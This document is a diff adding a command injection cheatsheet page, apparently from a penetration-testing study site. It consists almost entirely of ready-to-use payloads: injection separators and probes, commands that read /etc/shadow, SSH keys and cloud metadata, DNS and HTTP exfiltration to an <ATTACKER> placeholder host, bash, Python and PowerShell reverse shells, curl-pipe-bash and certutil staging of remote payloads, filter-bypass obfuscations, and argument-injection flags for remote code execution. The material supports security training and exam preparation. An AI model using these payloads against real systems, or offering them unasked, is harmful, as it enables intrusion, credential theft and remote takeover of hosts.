@@ -1,0 +1,286 @@
+---
+title: Cheatsheet
+description: Single-page command injection reference - separators, detection probes, execution one-liners, blind exfil, top filter bypasses, and argument injection.
+mitre: [T1190, T1059]
+d3fend: [D3-MH, D3-PSA]
+impact: [RCE]
+owasp: [A05]
+sidebar:
+  order: 8
+  label: Cheatsheet
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## Separators
+
+| Sep | URL-enc | Both run? | Output | Notes |
+| --- | --- | --- | --- | --- |
+| `;` | `%3b` | Yes | Both | Fails on cmd.exe |
+| `\n` | `%0a` | Yes | Both | Most reliable; rarely filtered |
+| `&` | `%26` | Yes | Both | Background on Linux; sequential on Windows |
+| `\|` | `%7c` | Yes | Injected only | |
+| `&&` | `%26%26` | If first succeeds | Both | |
+| `\|\|` | `%7c%7c` | If first fails | Injected only | |
+| `` ` ` `` | `%60%60` | Substitution | Linux/macOS only |
+| `$()` | `%24%28%29` | Substitution | Linux/macOS only |
+
+## Detection probes
+
+```
+<original>;id
+<original>%0aid
+<original>|id
+<original>&&id
+<original>`id`
+<original>$(id)
+```
+
+Success: `uid=` in response body, or response time delta if blind.
+
+## Execution
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+# Identity & environment
+id; whoami; hostname; uname -a; pwd; env
+
+# Files
+cat /etc/passwd
+cat /etc/shadow
+cat /var/www/html/.env
+cat ~/.ssh/id_rsa
+cat /proc/self/environ
+
+# Network & privesc
+ip a; ss -tlnp 2>/dev/null
+sudo -n -l
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+
+# Cloud metadata
+curl -s --max-time 2 http://169.254.169.254/latest/meta-data/
+
+# Output capture patterns
+;id 2>&1                                # merge stderr
+;id > /tmp/.r 2>&1; cat /tmp/.r         # write-then-read
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+# Identity & environment
+whoami /all; hostname; systeminfo; ipconfig /all
+Get-ChildItem env:
+
+# Files
+type C:\Users\admin\Desktop\flag.txt
+Get-Content C:\inetpub\wwwroot\web.config
+Get-Content C:\Windows\Panther\Unattend.xml
+
+# Privesc-adjacent
+cmdkey /list
+netsh wlan show profile
+Get-CimInstance Win32_Service | Select Name,PathName,StartName
+
+# Cloud metadata
+Invoke-RestMethod -Uri http://169.254.169.254/metadata/instance?api-version=2021-02-01 -Headers @{Metadata="true"} -TimeoutSec 2
+```
+
+</TabItem>
+</Tabs>
+
+## Blind & OOB
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+# Time-based
+;sleep 10
+;ping -c 10 127.0.0.1
+
+# DNS exfil (Burp Collaborator / interactsh)
+;nslookup <ATTACKER>
+;nslookup $(whoami).<ATTACKER>
+;nslookup $(id|base64 -w0|tr -d '=').<ATTACKER>
+
+# HTTP exfil
+;curl <ATTACKER>/$(whoami)
+;curl <ATTACKER>/$(id|base64 -w0)
+;curl -X POST <ATTACKER> -d "$(cat /etc/passwd)"
+
+# No curl/wget
+;exec 3<>/dev/tcp/<ATTACKER>/80; echo -e "GET /$(whoami) HTTP/1.0\r\n\r\n" >&3
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+# Time-based
+;ping -n 11 127.0.0.1
+;Start-Sleep -s 10
+
+# DNS / HTTP exfil
+;nslookup "$(whoami).<ATTACKER>"
+;iwr <ATTACKER>/$(whoami)
+;Invoke-WebRequest <ATTACKER> -Method POST -Body (Get-Content C:\Windows\win.ini -Raw)
+
+# cmd.exe (no PowerShell)
+&certutil -urlcache -split -f http://<ATTACKER>/x %TEMP%\x
+```
+
+</TabItem>
+</Tabs>
+
+## Reverse shells
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+# Listener
+nc -lvnp <LPORT>
+
+# bash TCP
+;bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+
+# Filter-resistant (brace expansion + base64)
+;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88TEhPU1Q+LzxMUE9SVD4gMD4mMQ==}|{base64,-d}|{bash,-i}
+
+# python (no /dev/tcp)
+;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
+
+# Stage from your server
+;curl <ATTACKER>/r.sh|bash
+
+# TTY upgrade (after callback)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z, then locally: stty raw -echo; fg ; export TERM=xterm-256color
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+# PowerShell reverse shell
+;powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+
+# Encoded (filter bypass)
+;powershell -nop -w hidden -enc <BASE64-UTF16LE>
+
+# Stage Nishang or ConPtyShell
+;IEX(IWR -UseBasicParsing http://<ATTACKER>/Invoke-ConPtyShell.ps1);Invoke-ConPtyShell <LHOST> <LPORT>
+
+# certutil drop-and-run (no PowerShell)
+&certutil -urlcache -split -f http://<ATTACKER>/nc.exe %TEMP%\nc.exe&%TEMP%\nc.exe -e cmd.exe <LHOST> <LPORT>
+```
+
+</TabItem>
+</Tabs>
+
+## Filter bypasses
+
+### Spaces
+
+```bash
+{cat,/etc/passwd}                       # brace expansion
+cat${IFS}/etc/passwd                    # IFS variable
+cat%09/etc/passwd                       # tab
+```
+
+### Slashes
+
+```bash
+${PATH:0:1}                             # = "/"
+${HOME:0:1}                             # = "/"
+%HOMEPATH:~6,-11%                       # cmd: = "\"
+$env:HOMEPATH[0]                        # PowerShell: = "\"
+```
+
+### Command names
+
+```bash
+w'h'o'am'i                              # quote insertion (Linux/Win)
+w"h"o"am"i
+who$@ami                                # positional param (Linux)
+w\h\o\am\i                              # backslash (Linux)
+who^ami                                 # caret (Windows cmd)
+$(rev<<<imaohw)                         # reversal (Linux)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")        # case conversion
+```
+
+### Wholesale
+
+```bash
+# Linux base64 wrapper
+;bash<<<$(base64 -d<<<<base64-payload>)
+
+# Windows encoded command
+;powershell -nop -w hidden -enc <BASE64-UTF16LE>
+```
+
+### Stacked example
+
+Filtered: spaces, `;`, `cat`, `/`. Newline allowed.
+
+```
+%0a${LS_COLORS:10:1}c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+## Argument injection
+
+| Binary | Flag | Effect |
+| --- | --- | --- |
+| `curl` | `-o <FILE> <URL>` | Write file |
+| `curl` | `-K <FILE>` | Read file (config parser) |
+| `curl` | `--upload-file <FILE> <URL>` | Exfil file |
+| `wget` | `-O <FILE> <URL>` | Write file |
+| `ssh` | `-o ProxyCommand="<CMD>" anyhost` | RCE |
+| `tar` | `--checkpoint=1 --checkpoint-action=exec=<CMD>` | RCE |
+| `find` | `-exec <CMD> \;` | RCE |
+| `git` | `clone --upload-pack="<CMD>" 'ssh://x/x'` | RCE (CVE-2017-1000117 family) |
+| `psql` | `-c '\! <CMD>'` | RCE via shell escape |
+
+Detect by sending value starting with `-` (e.g., `--help`, `--version`). Response change = argv reached.
+
+## Encoding helpers
+
+```bash
+# base64 for Linux bash<<< wrapper
+echo -n '<command>' | base64 -w0
+
+# base64 for PowerShell -enc (UTF-16LE!)
+echo -n '<command>' | iconv -t UTF-16LE | base64 -w0
+
+# URL encode in shell
+python3 -c "import urllib.parse;print(urllib.parse.quote('<payload>'))"
+```
+
+## OOB listeners
+
+```bash
+# Burp Collaborator: built into Burp Pro
+# interactsh
+interactsh-client                       # public server, prints hostname
+
+# Self-hosted (your VPS)
+sudo tcpdump -i any -n udp port 53      # DNS
+python3 -m http.server 80               # HTTP
+nc -lvnp 80                             # raw HTTP
+```
+
+## Quick decision tree
+
+1. Output reflected? → use `;` or `\n`, run `id`
+2. Output suppressed? → use `;sleep 10` to confirm, then OOB via curl/nslookup
+3. "Invalid input" error? → reduce by one char to find filter, apply matching bypass
+4. Binary takes user value as arg without shell? → try `--help`, then exploit-flags table above
+5. Got RCE, need shell? → bash `/dev/tcp` or PowerShell TCPClient, base64-wrap if filtered
+
+<Aside type="tip">
+Bookmark this page during exams. Every other page in this section drills deeper; this one is the lookup table for when you've already done the analysis and need the payload.
+</Aside>
